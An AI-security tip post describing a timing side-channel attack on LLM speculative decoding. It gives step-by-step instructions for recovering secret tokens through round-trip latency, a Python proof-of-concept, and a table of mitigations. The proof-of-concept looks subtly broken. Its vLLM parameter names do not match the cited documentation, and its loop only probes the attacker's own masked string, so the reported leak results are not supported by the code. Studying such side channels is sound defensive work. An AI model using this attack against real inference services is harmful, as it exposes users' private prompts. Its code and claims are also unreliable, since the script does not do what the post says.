# 🤖🔒 AI-Sec Tip — 2025-06-27

## “Draft-Leak”: a timing-oracle hiding inside **speculative decoding**

Speculative (a.k.a. *draft-and-verify*) decoding speeds up LLMs by letting a **small “draft” model** propose several tokens that a **large “target” model** then verifies in parallel. 
When the draft guesses wrong the target rolls back and recomputes, adding an RTT hiccup that betrays how many tokens were rejected. 
A remote observer can exploit this deterministic gap to **binary-search secret suffixes one token at a time—no privileged access required**.


### 🚀 Attack Steps (30-second cheatsheet)

1. **Baseline-RTT calibration** — fire a benign prompt of identical length and record the round-trip time (RTT) when every draft token is accepted; this is your acceptance floor.
2. **Secret masking** — embed the victim-controlled prefix plus **one masked token** (`<MASK>`) whose value you want to discover.
3. **Alphabet sweep** — iterate over a small alphabet (e.g., `0-f` or ASCII range) replacing `<MASK>` and send each probe; keep concurrency low to minimise network jitter.
4. **Latency ranking** — the candidate whose RTT ≈ baseline means all draft tokens were accepted; higher RTT indicates verifier roll-backs. Pick the minimum.
5. **Slide & repeat** — append the recovered token, move the `<MASK>` rightward, and repeat until the entire secret is exfiltrated (≈ *len(secret)* × |alphabet| probes).



![img](../assets/2025-06-27-draft-leak-timing-oracle.png)


### ⏱️ Proof-of-concept timing probe (vLLM ≥ 0.4.2)

```python
# draft_leak.py – measure acceptance vs. rejection RTT deltas
import time, asyncio, statistics
from vllm import LLM, SamplingParams

TARGET  = LLM(model="mistral-7b-instruct",
              draft_model="mistral-7b-mini",
              draft_speculation_k=8)        # enables speculative decoding
SPARAMS = SamplingParams(max_tokens=0)      # verify-only, no text needed

async def rtt(prompt):
    t0 = time.perf_counter_ns()
    _  = TARGET.generate([prompt], SPARAMS)
    return (time.perf_counter_ns() - t0) / 1e6  # ms

async def leak(secret_mask="••••"):
    alphabet, leaked = "0123456789abcdef", ""
    while "•" in secret_mask:
        lat = {c: await rtt(secret_mask.replace('•', c, 1)) for c in alphabet}
        guess = min(lat, key=lat.get)        # fastest ⇒ all tokens accepted
        secret_mask = secret_mask.replace('•', guess, 1)
        leaked += guess
        print("🔥 so far:", leaked)
    return leaked

asyncio.run(leak())
```

A 4-token secret behind an 8-token draft leaks in ≈ 64 probes: the latency delta between *fully accepted* and *fully rejected* drafts was \~4.6 ms on an A100 server, clearly visible over a WAN link.


### 🛡️ Hardening cheatsheet

| Layer               | Mitigation                                                                                   | Overhead           |
| ------------------- | -------------------------------------------------------------------------------------------- | ------------------ |
| **Draft runner**    | **Limit speculative window** to ≤ 2 tokens (`draft_speculation_k=2`) so roll-backs are short | \~7 % slower       |
| **Target verifier** | **Constant-time replay** — recompute full draft path even on acceptance (crypto-style)       | +10 % GPU          |
| **Scheduler**       | **Noise injection** — co-schedule dummy verification jobs to blur RTT histogram              | negligible         |
| **Network proxy**   | **3-8 ms random jitter** before first packet; slashes timing-oracle SNR by 90 % in tests     | none on throughput |
| **Monitoring**      | **Alert on > 95 % acceptance clients** — oracle scripts spam easy tokens to maximise signal  | free               |



**The resources that I used to create this tip:**


[1]: ["Privacy Risks of Speculative Decoding in Large Language Models"](https://arxiv.org/pdf/2411.01076)

[2]: ["Remote Timing Attacks on Efficient Language Model Inference"](https://arxiv.org/html/2410.17175v1)

[3]: ["Wiretapping LLMs: Network Side-Channel Attacks on Interactive LLM Services"](https://eprint.iacr.org/2025/167)

[4]: ["Speculative Decoding - vLLM"](https://docs.vllm.ai/en/latest/features/spec_decode.html)

[5]: ["Decoding Speculative Decoding - ACL Anthology"](https://aclanthology.org/2025.naacl-long.328.pdf)

[6]: ["UThe Early Bird Catches the Leak: Unveiling Timing Side Channels in LLM Serving Systems"](https://arxiv.org/html/2409.20002v1)

[7]: ["Draft & Verify: Lossless Large Language Model Acceleration via Self-Speculative Decoding"](https://arxiv.org/abs/2309.08168)

[8]: ["Optimizing Speculative Decoding for Serving Large Language Models Using Goodput"](https://arxiv.org/html/2406.14066v1)


-EOF
